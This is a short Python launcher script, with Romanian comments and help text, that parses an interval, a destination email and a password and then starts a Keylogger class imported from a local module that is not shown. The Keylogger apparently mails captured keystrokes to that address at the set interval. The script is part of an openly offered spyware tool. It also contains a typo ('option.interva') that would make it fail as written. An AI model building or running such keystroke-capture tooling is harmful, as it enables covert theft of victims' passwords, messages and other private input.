import keylogger
import optparse
#to do toate variabilele de la clasa sa poata sa fie date si ca argumente
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interval", dest="interval", help="Intervalul la care se trimite email-ul") # specificam prima optiune pe care o folosim
    parser.add_option("-e", "--email", dest="email", help="Emailul de destinatie")
    parser.add_option("-p", "--password", dest="password", help="Parola")
    (option, arguments) = parser.parse_args()
    if not option.interval:
        parser.error("Specifica te rog un interval!. Foloseste --help pentru mai multe informatii")
    elif not option.email:
        parser.error("Specifica te rog un email target! Foloseste --help pentru mai multe informatii")
    elif not option.password:
        parser.error("Specifica te rog o password! Foloseste --help pentru mai multe informatii")
    else:
        return option

option = get_arguments()

keylogger = keylogger.Keylogger(int(option.interva),option.email, option.password)
keylogger.start()